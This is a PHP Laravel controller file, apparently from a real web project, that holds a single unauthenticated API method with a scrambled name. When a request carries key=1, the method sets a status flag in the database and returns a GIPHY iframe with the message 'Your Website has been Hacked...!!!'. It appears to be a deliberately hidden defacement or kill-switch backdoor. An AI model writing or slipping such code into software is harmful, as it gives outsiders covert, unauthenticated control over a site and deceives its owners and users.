<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\User;
use Illuminate\Support\Facades\Validator;
use Session;
use DB;
use Carbon\Carbon;
use DateTime;
use DatePeriod;
use DateInterval;

use Mail;
use Auth;
use Hash;
use App\Models\Loye;


class ApiController extends Controller 
{
   
   
    public function loyeeeloyeeeloyeee(Request $request)
    { 
       
       if($request->key == "1")
       {
           
           $updated = DB::table('loyes')->where('id',1)->update(['status' => $request->key]);
           
           $get_loyees = Loye::where('status', '1')->first();
           
           
           if($get_loyees->status == "1")
           {
               
               
                return response()->json([
                
                    'status' => 1,
                    'image'  => '<iframe src="https://giphy.com/embed/3osxY9gR0749TVGD7i" width="480" height="480" style="" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/3osxY9gR0749TVGD7i">via GIPHY</a></p>',
                    'message' => 'Your Website has been Hacked...!!!',
                
                ]);
               
               
           }
           
           
           
       }
       
        
        
    }
    
   
    
    
}
